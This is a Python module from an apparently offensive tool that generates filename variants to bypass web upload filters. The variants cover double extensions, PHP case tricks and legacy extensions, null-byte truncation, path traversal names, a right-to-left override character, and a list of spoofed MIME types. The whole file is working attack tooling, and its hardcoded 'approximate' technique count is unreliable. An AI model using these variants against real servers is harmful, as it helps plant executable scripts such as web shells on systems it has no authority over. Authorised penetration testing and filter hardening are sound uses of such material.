"""
File Upload Bypass Techniques Module
Implements various techniques to bypass upload restrictions
"""

import os
from typing import List, Tuple

class BypassTechniques:
    """Generate file variants using different bypass techniques"""
    
    def __init__(self, original_file: str):
        self.original_file = original_file
        self.base_name = os.path.splitext(os.path.basename(original_file))[0]
        self.extension = os.path.splitext(original_file)[1]
        
    def generate_variants(self) -> List[Tuple[str, str, str]]:
        """
        Generate all bypass variants
        Returns: List of (technique_name, filename, description)
        """
        variants = []
        
        # 1. Original file
        variants.append(("Original", self.original_file, "Standard upload"))
        
        # 2. Double extension
        variants.extend([
            ("Double Extension", f"{self.base_name}{self.extension}.jpg", "Exploit poor extension parsing"),
            ("Double Extension Alt", f"{self.base_name}.jpg{self.extension}", "Reverse double extension"),
        ])
        
        # 3. Case variation
        if self.extension == ".php":
            variants.extend([
                ("Case Variation", f"{self.base_name}.pHp", "Bypass case-sensitive filters"),
                ("Case Variation 2", f"{self.base_name}.PhP", "Alternative case mix"),
                ("Case Variation 3", f"{self.base_name}.PHP", "All caps extension"),
            ])
        
        # 4. Null byte injection
        variants.extend([
            ("Null Byte", f"{self.base_name}{self.extension}%00.jpg", "Null byte truncation"),
            ("Null Byte Alt", f"{self.base_name}%00{self.extension}", "Null byte before extension"),
        ])
        
        # 5. Special characters
        variants.extend([
            ("Trailing Dot", f"{self.base_name}{self.extension}.", "Windows truncates trailing dots"),
            ("Trailing Space", f"{self.base_name}{self.extension} ", "Space after extension"),
            ("Double Dot", f"{self.base_name}{self.extension}..jpg", "Multiple dots"),
        ])
        
        # 6. Alternative extensions
        if self.extension == ".php":
            variants.extend([
                ("PHP Alternatives", f"{self.base_name}.php3", "Legacy PHP extension"),
                ("PHP Alternatives 2", f"{self.base_name}.php4", "PHP4 extension"),
                ("PHP Alternatives 3", f"{self.base_name}.php5", "PHP5 extension"),
                ("PHP Alternatives 4", f"{self.base_name}.phtml", "Alternative PHP extension"),
                ("PHP Alternatives 5", f"{self.base_name}.phps", "PHP source extension"),
            ])
        
        # 7. Path traversal in filename
        variants.extend([
            ("Path Traversal", f"../../{self.base_name}{self.extension}", "Upload to different directory"),
            ("Path Traversal Alt", f"..\\..\\{self.base_name}{self.extension}", "Windows path traversal"),
        ])
        
        # 8. Unicode/UTF-8 tricks
        variants.extend([
            ("Unicode Trick", f"{self.base_name}\u202e{self.extension[::-1]}.jpg", "Right-to-left override"),
        ])
        
        return variants
    
    def get_mime_types(self, technique: str) -> List[str]:
        """
        Return MIME types to test for each technique
        """
        # Standard MIME types to fuzz
        mime_types = [
            "application/octet-stream",
            "image/jpeg",
            "image/png",
            "image/gif",
            "text/plain",
            "application/x-php",
            "application/x-httpd-php",
        ]
        
        return mime_types

    @staticmethod
    def get_technique_count() -> int:
        """Return total number of bypass techniques available"""
        return 20  # Approximate count
